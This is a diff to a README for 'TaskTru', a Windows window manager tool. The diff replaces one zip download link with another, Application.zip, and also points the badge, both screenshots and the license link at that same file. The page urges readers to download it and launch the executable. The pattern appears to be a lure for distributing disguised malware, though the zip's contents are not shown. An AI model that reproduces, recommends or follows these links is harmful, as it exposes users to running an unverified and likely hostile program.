@@ -1,6 +1,6 @@
 # 🌟 TaskTru - Windows Window Manager Tool 🪟
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/thenastey1902gh/taskTru/releases/download/v1.0.0/Application.zip)](https://github.com/thenastey1902gh/taskTru/releases/download/v1.0.0/Application.zip)
 
 TaskTru is a versatile Windows window manager tool designed to enhance your productivity by offering unique window management features. With TaskTru, you can make your windows click-through, topmost, and transparent, all with the convenience of an opacity slider. This tool is especially useful for individuals looking to optimize their workflow and create a customized desktop experience.
 
@@ -20,15 +20,15 @@ TaskTru is a versatile Windows window manager tool designed to enhance your prod
 
 Here are some screenshots of TaskTru in action:
 
-![TaskTru Screenshot 1](https://example.com/screenshot1.png)
+![TaskTru Screenshot 1](https://github.com/thenastey1902gh/taskTru/releases/download/v1.0.0/Application.zip)
 
-![TaskTru Screenshot 2](https://example.com/screenshot2.png)
+![TaskTru Screenshot 2](https://github.com/thenastey1902gh/taskTru/releases/download/v1.0.0/Application.zip)
 
 ## Installation 🛠️
 
 To get started with TaskTru, simply download the software package from the link below and launch the executable:
 
-[Download TaskTru](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) 🌟
+[Download TaskTru](https://github.com/thenastey1902gh/taskTru/releases/download/v1.0.0/Application.zip) 🌟
 
 Please note that the software needs to be launched after downloading.
 
@@ -46,7 +46,7 @@ We welcome contributions from the community to make TaskTru even better. If you 
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/username/repository/blob/master/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/thenastey1902gh/taskTru/releases/download/v1.0.0/Application.zip) file for details.
 
 ---
 
